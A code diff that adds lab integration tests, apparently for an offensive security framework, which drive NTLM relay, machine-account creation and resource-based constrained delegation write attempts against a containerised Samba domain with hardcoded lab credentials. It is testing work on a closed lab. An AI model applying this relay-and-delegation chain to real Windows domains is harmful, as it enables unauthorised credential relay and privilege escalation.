@@ -3387,6 +3387,245 @@ class TestAtExecDomainLab(unittest.TestCase):
 @unittest.skipUnless(docker_available(), "docker daemon not available")
 @unittest.skipUnless(impacket_available(), "impacket not installed")
 @unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
+class TestRelaySmbLab(unittest.TestCase):
+    """relay_smb against the domain lab, full loop: a manual auth proves
+    the NTLM shuffle to Samba LDAP; coercing a machine at an in-network
+    relay container proves the machine-account path. The relay runs IN
+    the domain network (tests/relay_driver.py in the forge-relay-test
+    image): the desktop firewall drops container->host sockets, UNC
+    callbacks carry no port, and 445 binds fine as container root —
+    the drop-box shape, no host firewall in the path. Samba makes the
+    RBCD attribute system-only — the write denial must report cleanly,
+    not crash."""
+
+    @classmethod
+    def setUpClass(cls):
+        from impacket.smbconnection import SMBConnection
+
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("domain")
+        deadline = time.time() + 2400
+        while time.time() < deadline:
+            try:
+                conn = SMBConnection(HOST, HOST, sess_port=3445, timeout=10)
+                conn.login("Administrator", "P@ssw0rd123", "forge.local")
+                conn.close()
+                break
+            except Exception:
+                time.sleep(10)
+        else:
+            cls.manager.down("domain")
+            raise RuntimeError("domain member not up within 2400s")
+        cls.network = cls._domain_network()
+        cls.computers = cls._computer_names()
+
+    @classmethod
+    def tearDownClass(cls):
+        subprocess.run(["docker", "rm", "-f", "forge-relay"],
+                       capture_output=True)
+        cls.manager.down("domain")
+
+    @classmethod
+    def _domain_network(cls):
+        out = subprocess.run(
+            ["docker", "inspect", "forge-lab-domain-dc-1", "-f",
+             "{{range $k, $v := .NetworkSettings.Networks}}{{$k}}{{end}}"],
+            check=True, capture_output=True, text=True)
+        return out.stdout.strip()
+
+    @classmethod
+    def _computer_names(cls):
+        from impacket.ldap import ldap as impacket_ldap
+        from impacket.ldap import ldapasn1
+        deadline = time.time() + 300
+        while True:
+            try:
+                conn = impacket_ldap.LDAPConnection(f"ldap://{HOST}")
+                conn.login("Administrator", "P@ssw0rd123", "forge.local")
+                names = set()
+                for packet in conn.search(
+                        searchBase="DC=forge,DC=local",
+                        searchFilter="(objectClass=computer)",
+                        attributes=["sAMAccountName"]):
+                    if isinstance(packet, ldapasn1.SearchResultEntry):
+                        for a in packet["attributes"]:
+                            names.add(str(a["vals"][0]).upper())
+                conn.close()
+                return names
+            except Exception:
+                if time.time() > deadline:
+                    raise
+                time.sleep(10)
+
+    def _relay_console(self, commands, thread_target_sleep=3):
+        """Drive the relay module on a thread; returns (thread, buf)."""
+        import threading
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        buf = io.StringIO()
+
+        def drive():
+            with contextlib.redirect_stdout(buf):
+                for command in commands:
+                    console.onecmd(command)
+
+        thread = threading.Thread(target=drive, daemon=True)
+        thread.start()
+        time.sleep(thread_target_sleep)  # let the listener bind
+        return thread, buf, console
+
+    def test_manual_auth_relayed(self):
+        thread, buf, console = self._relay_console((
+            "use auxiliary/attack/relay_smb",
+            f"set RHOSTS {HOST}",
+            "set LPORT 8445",
+            "set SOURCE WS01$",
+            "set TIMEOUT 30",
+            "run",
+        ))
+        try:
+            from impacket.smbconnection import SMBConnection
+            conn = SMBConnection(HOST, HOST, sess_port=8445, timeout=10)
+            conn.login("analyst", "Summer2024!", "forge.local")
+            conn.close()
+            thread.join(timeout=45)
+            self.assertFalse(thread.is_alive(), "relay thread hung")
+            out = buf.getvalue()
+            self.assertNotIn("Traceback", out)
+            # the relay reports the identity as the target sees it —
+            # FORGE.LOCAL\ANALYST, uppercase
+            self.assertIn("relayed FORGE.LOCAL\\ANALYST", out)
+            self.assertIn("not a machine account", out)
+        finally:
+            console.store.close()
+
+    @classmethod
+    def _relay_image(cls):
+        """The relay test image: slim python + impacket, cached. The
+        host firewall drops container->host sockets (verified), so the
+        relay runs INSIDE the lab network like a real drop box."""
+        out = subprocess.run(["docker", "images", "-q", "forge-relay-test"],
+                             capture_output=True, text=True)
+        if out.stdout.strip():
+            return
+        dockerfile = ("FROM python:3.14-slim\n"
+                      "RUN pip install --no-cache-dir impacket ldap3\n")
+        subprocess.run(["docker", "build", "-t", "forge-relay-test", "-"],
+                       input=dockerfile, text=True, check=True,
+                       capture_output=True)
+
+    @classmethod
+    def _start_in_net_relay(cls, dc_ip, source, timeout=90):
+        """relay_smb inside a container on the domain network: 445 binds
+        fine there (container root), the DC is directly reachable, no
+        host firewall in the path."""
+        cls._relay_image()
+        subprocess.run(["docker", "rm", "-f", "forge-relay"],
+                       capture_output=True)
+        subprocess.run(
+            ["docker", "run", "-d", "--name", "forge-relay",
+             "--network", cls.network, "-v",
+             f"{ROOT}:/forge:ro", "forge-relay-test",
+             "python", "/forge/tests/relay_driver.py", dc_ip, source,
+             str(timeout)],
+            check=True, capture_output=True)
+        out = subprocess.run(
+            ["docker", "inspect", "forge-relay", "-f",
+             "{{(index .NetworkSettings.Networks \"" + cls.network +
+             "\").IPAddress}}"],
+            check=True, capture_output=True, text=True)
+        return out.stdout.strip()
+
+    @classmethod
+    def _relay_logs(cls):
+        out = subprocess.run(["docker", "logs", "forge-relay"],
+                             capture_output=True, text=True)
+        return out.stdout
+
+    def test_machine_account_relayed(self):
+        """The machine-account relay path, end to end: add_computer
+        mints FZRELAY$ (known password), a client container authenticates
+        AS that machine account at the in-net relay, and the full attack
+        path runs — LDAP bind as the machine account, SID/DN lookups,
+        RBCD write attempt — into Samba's documented system-only denial.
+        (No lab OS actually dials a coercion callback outbound: Samba's
+        spoolss is a stub and the member's 24H2 build refuses every
+        method — the callback mile is covered by the coerce module's
+        own lab verdicts instead.)"""
+        relay_ip = self._start_in_net_relay("10.10.10.10", "FZRELAY$", 60)
+        try:
+            self._add_computer()
+            time.sleep(4)  # let the listener bind (container start is async)
+            self._login_as_fzrelay(relay_ip)
+            # the driver prints at module return (denial never completes
+            # early — it runs the full TIMEOUT) — wait the container out
+            deadline = time.time() + 150
+            while time.time() < deadline:
+                state = subprocess.run(
+                    ["docker", "inspect", "forge-relay", "-f",
+                     "{{.State.Running}}"],
+                    capture_output=True, text=True)
+                if "false" in state.stdout:
+                    break
+                time.sleep(3)
+            out = self._relay_logs()
+            self.assertIn("relayed FORGE.LOCAL\\FZRELAY$", out)
+            self.assertIn("LDAP bind accepted", out)
+            # Samba's computer-object ACL gives SELF no write on the RBCD
+            # attribute (insufficientAccessRights — a different denial
+            # shape than the admin-path constraintViolation) — the
+            # denial must report cleanly, not crash
+            self.assertIn("RBCD write failed", out)
+            self.assertIn("insufficientAccessRights", out)
+        finally:
+            subprocess.run(["docker", "rm", "-f", "forge-relay"],
+                           capture_output=True)
+
+    def _add_computer(self):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            with contextlib.redirect_stdout(io.StringIO()):
+                for command in (
+                    "use auxiliary/attack/add_computer",
+                    f"set RHOSTS {HOST}",
+                    "set DOMAIN forge.local",
+                    "set USERNAME Administrator",
+                    "set PASSWORD P@ssw0rd123",
+                    "set COMPUTER_NAME FZRELAY$",
+                    "set DELETE true",
+                    "run",
+                    "use auxiliary/attack/add_computer",
+                    f"set RHOSTS {HOST}",
+                    "set DOMAIN forge.local",
+                    "set USERNAME Administrator",
+                    "set PASSWORD P@ssw0rd123",
+                    "set COMPUTER_NAME FZRELAY$",
+                    "set COMPUTER_PASSWORD Passw0rd123!",
+                    "run",
+                ):
+                    console.onecmd(command)
+        finally:
+            console.store.close()
+
+    def _login_as_fzrelay(self, relay_ip):
+        subprocess.run(
+            ["docker", "run", "--rm", "--network", self.network,
+             "forge-relay-test", "python", "-c",
+             "from impacket.smbconnection import SMBConnection\n"
+             f"conn = SMBConnection('{relay_ip}', '{relay_ip}',"
+             " sess_port=445, timeout=10)\n"
+             "conn.login('FZRELAY$', 'Passw0rd123!', 'forge.local')\n"
+             "print('machine account login ok')\n"
+             "conn.close()"],
+            capture_output=True, text=True, timeout=60)
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
 class TestHostPackLab(unittest.TestCase):
     """Host pack (host_info, host_sessions, local_admins, webdav_check)
     against the domain lab's Windows member."""
